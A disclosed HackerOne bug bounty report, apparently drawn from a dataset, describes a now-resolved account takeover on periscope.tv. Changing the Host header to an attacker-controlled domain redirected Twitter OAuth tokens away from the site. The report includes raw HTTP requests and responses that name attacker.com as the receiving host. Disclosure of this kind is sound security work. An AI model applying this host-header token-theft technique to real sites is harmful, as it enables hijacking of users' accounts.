---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '317476'
original_report_id: '317476'
title: Account Takeover in Periscope TV
weakness: Cross-site Scripting (XSS) - Generic
team_handle: x
created_at: '2018-02-19T03:28:43.256Z'
disclosed_at: '2018-09-06T15:37:02.275Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 199
asset_identifier: '*.periscope.tv'
asset_type: WILDCARD
max_severity: none
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Account Takeover in Periscope TV

## Metadata

- HackerOne Report ID: 317476
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: x
- Disclosed At: 2018-09-06T15:37:02.275Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Summary:** 

When you login periscope.tv using twitter, and change the host header from `www.periscope.tv` to `attacker.com/www.periscope.tv`, the oauth redirect destination will be `attacker.com/www.periscope.tv`, thus allowing attacker to send the oauth authorize link to victim, and takeover their account after auto redirect.

## Steps To Reproduce:
Visit https://www.periscope.tv/ and click login with twitter, a request should appear

```
GET /i/twitter/login?csrf=████ HTTP/1.1
Host: www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Change the host header to 

`Host: hackerone.com/www.periscope.tv`

Full request

```
GET /i/twitter/login?csrf=██████ HTTP/1.1
Host: hackerone.com/www.periscope.tv
User-Agent: █████████
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.periscope.tv/
cookie: ...
```

Response should be something like 

```
<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;https://twitter.com/oauth/authenticate?oauth_token=████████"></head></html>
```

Send this link to victim, after authorizing, victim's twitter oauth token and verifier is sent to hackerone.com, attacker could now reuse the same token to takeover victim's account.

Vimeo: https://vimeo.com/256356501
password: ███████

## Impact

Account Takeover for periscope.tv

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
